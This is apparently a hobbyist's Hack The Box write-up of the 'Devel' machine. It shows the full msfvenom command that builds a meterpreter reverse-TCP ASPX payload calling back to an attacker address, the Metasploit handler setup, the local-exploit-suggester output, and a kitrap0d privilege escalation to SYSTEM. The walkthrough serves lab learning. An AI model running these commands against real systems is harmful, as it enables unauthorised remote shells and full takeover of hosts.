# Devel (Not trad Windows)

So this box we saw that we could access FTP and could put files in so….

using msfvenom

```bash
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.125 LPORT=4444 -f aspx -o payload2.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2880 bytes
Saved as: payload2.aspx

```

We created a payload that we could upload and use msfconsole to access!

```bash
use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

We set the exploit and payload to connect

from here i messed about a lil but the point is we need to background the session so we can do further recon

```bash
(Meterpreter 2)(c:\Users) > sessions 1
[*] Backgrounding session 2...
[-] Invalid session identifier: 1
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> sessions -i

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.125:4444 -> 10.129.73.85:49166 (10.129.73.85)
```

Once backgrounded we can then see suggestions on post exploitation because this was a windows 7 box there was a tonne

```bash
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> search suggest

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  auxiliary/server/icmp_exfil                                            normal     No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors         2010-03-09       good       No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  post/multi/recon/local_exploit_suggester                               normal     No     Multi Recon Local Exploit Suggester
   3  auxiliary/scanner/http/nagios_xi_scanner                               normal     No     Nagios XI Scanner
   4  post/osx/gather/enum_colloquy                                          normal     No     OS X Gather Colloquy Enumeration
   5  post/osx/manage/sonic_pi                                               normal     No     OS X Manage Sonic Pi
   6  exploit/multi/http/torchserver_cve_2023_43654         2023-10-03       excellent  Yes    PyTorch Model Server Registration and Deserialization RCE
   7  exploit/windows/http/sharepoint_data_deserialization  2020-07-14       excellent  Yes    SharePoint DataSet / DataTable Deserialization
   8  exploit/windows/smb/timbuktu_plughntcommand_bof       2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
```

This allowed us to search for whats exploitable on the session

```bash
Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

```

decided to use number 3 as its first validated working

```bash
[*] Post module execution completed
[msf](Jobs:0 Agents:1) auxiliary(scanner/http/nagios_xi_scanner) >> use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms10_015_kitrap0d) >> show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     83.136.252.171   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

then it got the system!

```bash
[msf](Jobs:0 Agents:1) exploit(windows/local/ms10_015_kitrap0d) >> run

[*] Started reverse TCP handler on 10.10.14.125:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 3576 launched.
[*] Reflectively injecting the DLL into 3576...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.129.73.85
[*] Meterpreter session 3 opened (10.10.14.125:4444 -> 10.129.73.85:49167) at 2025-02-15 19:16:41 -0600

(Meterpreter 3)(c:\Users) > ls
```

BOOM root access very cool box to teach me about msfvenom and reverse tcp,cool!
